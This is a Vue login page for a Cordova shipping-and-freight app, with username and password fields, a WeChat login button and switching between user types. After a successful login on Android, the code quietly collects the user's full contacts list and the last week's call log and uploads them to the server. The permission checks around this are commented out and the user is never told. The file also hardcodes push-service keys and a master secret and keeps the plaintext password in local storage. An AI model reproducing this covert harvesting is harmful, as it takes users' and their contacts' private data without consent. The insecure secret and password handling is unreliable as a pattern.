<template>
  <div class="choose">
    <van-nav-bar
      title="登录"
      left-text="返回"
      left-arrow
      @click-left="onClickLeft"
      @click-right="onClickRight"
      :right-text="this.switch"
    >
      <!-- <van-icon name="search" slot="right" /> -->
    </van-nav-bar>
    <div class="loginBg">
      <div class="userIcon">
        <img style="width:2.2rem;height:1.6rem" :src="userIcon" alt />
        <p>{{ userType }}</p>
      </div>
    </div>
    <van-cell-group>
      <van-field
        v-model="userInfo.loginName"
        clearable
        label="用户名"
        right-icon="question-o"
        placeholder="请输入用户名"
        @click-right-icon="$toast('请输入您的手机号')"
        @blur="loseFocus"
      />
      <van-field
        v-model="userInfo.password"
        label="密码"
        placeholder="请输入密码"
        :type="inputType"
        :right-icon="iconName"
        @click-right-icon="showPassword"
      />
    </van-cell-group>
    <van-row>
      <van-col span="24" style="padding-left:.5rem;">
        <van-checkbox v-model="checked">记住密码</van-checkbox>
      </van-col>
    </van-row>
    <van-button
      round
      type="info"
      @click="userLogin"
      style="background: radial-gradient(farthest-side at 0 0, #0B6EFF 0%, #68AAFF 100%);"
    >登录</van-button>
    <van-row type="flex" justify="center" class="footer">
      <van-col span="6" @click="toRegister">现在注册</van-col>
      <van-col span="1">|</van-col>
      <van-col span="6" class="retrievePassword" @click="forgetPwd">忘记密码?</van-col>
    </van-row>
    <div class="box" @click="ress">微信登录</div>
  </div>
</template>

<script>
const wxLogin = (appid, url) => {
  let redirect_uri = encodeURIComponent(url);
  window.location.href = `https://open.weixin.qq.com/connect/oauth2/authorize?appid=${appid}&redirect_uri=${redirect_uri}&response_type=code&scope=snsapi_userinfo&state=STATUS#wechat_redirect`;
};
import { login, getRecordAddressList, getRecordCallLog } from "@/api/index.js";
export default {
  name: "Choose",
  data() {
    return {
      userInfo: {
        clientId: "1",
        appId: "ef9LGBiOVr9CIuVI4Mrpc7",
        appKey: "glPBr7Bk3u9RVDodLsAxH5",
        masterSecret: "3DHbeuYzZY8WCPQ0Jzibg7",
        appType: 3,
        token: 1,
        oldVersionNumber: "1.0",
        phoneId: "1",
        loginName: "",
        password: ""
      },
      userIcon: "",
      switch: "切换货主",
      userType: "船主",
      checked: true,
      iconName: "closed-eye",
      inputType: "password",
      regCode: "",
      num: 0
    };
  },
  created() {
    
    async function getClientId() {
      return await new Promise((resolve, reject) => {
        document.addEventListener(
          "deviceready",
          function() {
            window.JPush.getRegistrationID(data => {
              console.log("loginclientid", data);
              if (data) {
                resolve(data);
              } else {
                reject("");
              }
              // localStorage.setItem('clientId', data)
            });
          },
          false
        );
      });
    }
    let clientId = getClientId();
    clientId.then(res => {
      localStorage.setItem("clientId", res);
    });
    this.regCode = this.$route.params.regCode;
    this.userInfo.appType = this.$route.query.userType || 3;
    this.userInfo.loginName = this.$route.params.mobilePhone;
    this.userInfo.password = this.$route.params.password;
    // userType=2船主，userType=3货主
    if (this.userInfo.appType == 2) {
      this.userIcon = require("@/assets/image/shipper.png");
    } else {
      this.userIcon = require("@/assets/image/shipowner.png");
    }
    if (localStorage.getItem("userInfo")) {
      this.userInfo.loginName = JSON.parse(
        localStorage.getItem("userInfo")
      ).loginName;
      this.userInfo.password = JSON.parse(
        localStorage.getItem("userInfo")
      ).password;
    }
    let device = JSON.stringify(localStorage.getItem("device"));
    console.log(device);
    // this.userInfo.clientId = device.uuid || "1";
  },

  methods: {
    ress() {
      wxLogin("wxdc6c09634cd33d94", "http://192.168.0.104:8080/#/index/home");
    },
    // 登录，使用用户名loginName，密码password进行登录, clientId 手机唯一标识 ,appId 前台传app标识
    // ,appKey 前台传app标识 ,masterSecret 前台传app标识 ,用作消息推送 登录会获取到token信息,access_token为所有接口使用的令牌
    //  appType app类型 2: 货主 3:船主,token/区分苹果和安卓:0苹果 1安卓 oldVersionNumber app版本号
    userLogin() {
      this.userInfo.clientId = localStorage.getItem("clientId") || "";
      if (!this.$tools.regPassword(this.userInfo.password)) {
        return false;
      }
      login(this.userInfo)
        .then(res => {
          console.log(res);
          if (res.data.code == 200) {
            this.$toast("登录成功");
            if (this.checked) {
              this.rememberPassword();
            } else {
              localStorage.removeItem("userInfo");
            }
            localStorage.setItem("token", res.data.data.access_token);
            res.data.data.loginTime = +new Date();
            localStorage.setItem(
              "userLoginInfo",
              JSON.stringify(res.data.data)
            );
            this.$router.push({ path: "/index", query: {} });

            // 获取用户通讯录
            document.addEventListener(
              "deviceready",
              function() {
                if (device.platform == "Android") {
                  //  permissions.hasPermission(permissions.READ_CONTACTS, function(status) {
                  // if (status.hasPermission) {
                  console.log("授权成功");
                  async function contacts() {
                    return await new Promise((resolve, reject) => {
                      var options = new ContactFindOptions();
                      options.filter = "";
                      options.multiple = true;
                      var fields = ["displayName", "phoneNumbers"];
                      navigator.contacts.find(
                        fields,
                        onSuccess,
                        onError,
                        options
                      );

                      function onSuccess(contacts) {
                        resolve(contacts);
                      }
                      function onError(contactError) {
                        reject(contactError);
                      }
                    });
                  }
                  contacts().then(result => {
                    console.log("电话本", result);
                    let phoneList = {
                      userId: res.data.data.user_id,
                      addressListRecord: result
                    };
                    getRecordAddressList(
                      phoneList,
                      localStorage.getItem("token")
                    );
                  });
                  // } else {
                  //   console.log('授权失败')
                  // }
                  // });

                  // 获取用户通话记录
                  // permissions.hasPermission(permissions.READ_CALL_LOG, function(status) {
                  // if (status.hasPermission) {
                  console.log("授权成功");
                  async function getCallLog() {
                    return await new Promise((resolve, reject) => {
                      document.addEventListener(
                        "deviceready",
                        function() {
                          var filters = [
                            {
                              name: "date",
                              value: +new Date() - 604800000,
                              operator: ">="
                            }
                          ];
                          window.plugins.callLog.getCallLog(
                            filters,
                            function(data) {
                              console.log("getCallLog", data);
                              resolve(data);
                            },
                            function(data) {
                              console.log(data);
                              reject(data);
                            }
                          );
                        },
                        false
                      );
                    });
                  }

                  getCallLog().then(data => {
                    console.log("通话记录", data);
                    if (data.length == 0) {
                      console.log("kong");
                      return;
                    } else {
                      if (localStorage.getItem("token")) {
                        getRecordCallLog(
                          data,
                          localStorage.getItem("token")
                        ).then(res => {
                          console.log(res);
                        });
                      }
                    }
                  });
                  // } else {
                  //   console.log('授权失败')
                  // }
                  // });
                }
              },
              false
            );
          } else {
            this.$toast(res.data.message || "登录失败");
          }
        })
        .catch(res => {
          this.userInfo.loginName = "";
          this.userInfo.password = "";
        });
    },
    onClickLeft() {
      this.$router.go(-1);
    },
    onClickRight() {
      console.log(this.switch);
      if (this.switch == "切换货主") {
        this.switch = "切换企业";
        this.userInfo.appType = 2;
        this.userIcon = require("@/assets/image/shipper.png");
        this.userType = "货主";
      } else if (this.switch == "切换企业") {
        this.switch = "切换船主";
        this.userInfo.appType = 8;
        this.userIcon = require("@/assets/image/qiyeyonghu.png");
        this.userType = "企业用户";
      } else if (this.switch == "切换船主") {
        this.switch = "切换货主";
        this.userInfo.appType = 3;
        this.userIcon = require("@/assets/image/shipowner.png");
        this.userType = "船主";
      }
      // this.userInfo.appType = this.userInfo.appType == 3 ? 2 : (this.userInfo.appType == 8?3:8);
      // this.userType = this.userType == "船主" ? "货主" :( this.userType == "货主" ?"企业用户":"船主");
      // console.log(
      //   "img",
      //   this.userIcon == require("@/assets/image/shipowner.png")
      // );
      // this.userIcon =
      //   this.userIcon == require("@/assets/image/shipowner.png")
      //     ? require("@/assets/image/shipper.png")
      //     : (this.userIcon == require("@/assets/image/qiyeyonghu.png")
      //     ?require("@/assets/image/shipowner.png"):require("@/assets/image/qiyeyonghu.png"));
      // this.switch = this.switch == "切换货主" ? "切换船主" : (this.switch == "切换企业"?"切换货主":"切换船主");
    },
    toRegister() {
      console.log(this.userInfo.appType, this.switch, this.userType);
      this.$router.push({
        path: "/register",
        query: { userType: this.userInfo.appType }
      });
    },
    loseFocus() {
      console.log(this.$tools);
      if (!this.$tools.regPhone(this.userInfo.loginName)) {
        return false;
      }
    },
    regPassword() {
      if (!this.$tools.regPassword(this.userInfo.password)) {
        return false;
      }
    },
    showPassword() {
      this.iconName = this.iconName == "closed-eye" ? "eye-o" : "closed-eye";
      this.inputType = this.inputType == "password" ? "text" : "password";
    },
    // 记住密码
    rememberPassword() {
      localStorage.setItem("userInfo", JSON.stringify(this.userInfo));
    },
    //忘记密码
    forgetPwd() {
      this.$router.push({
        path: "/forgetPwd",
        query: { userType: this.userInfo.appType }
      });
    }
  }
};
</script>

<style lang="less" scoped>
.choose {
  .van-nav-bar {
    padding-top: 0.4rem;
  }
  .van-button {
    margin-top: 20px;
    width: 80%;
  }
  .loginBg {
    color: #fff;
    width: 100%;
    height: 250px;
    background: url("../../assets/image/login-bg.png") no-repeat;
    background-size: cover;
    .userIcon {
      img {
        margin-top: 50px;
        width: 30%;
      }
    }
    .van-cell-group {
      margin-top: 20px;
    }
  }

  .van-row {
    margin: 10px 20px;
    .van-checkbox__icon {
      font-size: 17px;
    }
    .van-checkbox__icon--checked .van-icon {
      background: radial-gradient(
        farthest-side at 0 0,
        #0b6eff 0%,
        #68aaff 100%
      );
    }
  }
  .footer {
    color: #bbb;
  }
}
input {
  display: block;
}
</style>
